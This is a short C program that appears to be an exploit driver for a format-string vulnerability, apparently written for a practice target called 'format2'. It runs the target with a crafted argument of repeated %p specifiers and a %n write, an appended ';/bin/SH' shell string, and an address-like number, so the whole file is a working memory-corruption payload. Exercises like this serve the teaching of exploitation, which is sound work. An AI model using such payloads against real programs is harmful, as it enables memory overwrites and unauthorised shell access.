#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>


int main()
{
	char * argv[] = {"./format2","%p%p%p%p%p%p%p%p%p%p%n;/bin/SH", "140737488349828", NULL};
	execvp(argv[0], argv);

	return 0;
}

